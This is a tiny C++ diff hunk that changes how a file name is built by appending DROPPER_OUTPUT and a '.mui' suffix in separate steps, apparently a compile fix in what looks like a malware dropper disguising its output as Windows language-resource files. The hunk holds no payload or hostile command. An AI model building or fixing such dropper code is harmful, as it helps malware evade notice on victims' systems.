@@ -368,7 +368,8 @@ void set_name(std::uint64_t os_version)
 #else
 
 	name4+=DROPPER_OUTPUT;
-	name5+=DROPPER_OUTPUT + ".mui";
+	name5+=DROPPER_OUTPUT;
+	name5+=".mui";
 
 #endif
 	}
